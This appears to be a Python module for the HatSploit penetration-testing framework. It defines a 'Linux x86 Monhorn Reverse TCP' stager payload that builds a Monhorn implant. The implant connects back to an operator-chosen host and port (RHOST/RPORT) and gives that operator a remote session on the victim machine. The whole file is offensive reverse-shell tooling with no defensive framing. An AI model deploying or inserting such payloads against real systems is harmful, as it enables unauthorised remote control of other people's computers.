#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from monhorn import Monhorn
from monhorn.session import MonhornSession

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Monhorn):
    details = {
        'Category': "stager",
        'Name': "Linux x86 Monhorn Reverse TCP",
        'Payload': "linux/x86/monhorn_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Monhorn reverse TCP payload for Linux x86.",
        'Architecture': "x86",
        'Platform': "linux",
        'Session': MonhornSession,
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        return self.get_monhorn(
            self.details['Platform'],
            self.details['Architecture'],
            self.handler['RHOST'],
            self.handler['RPORT']
        )
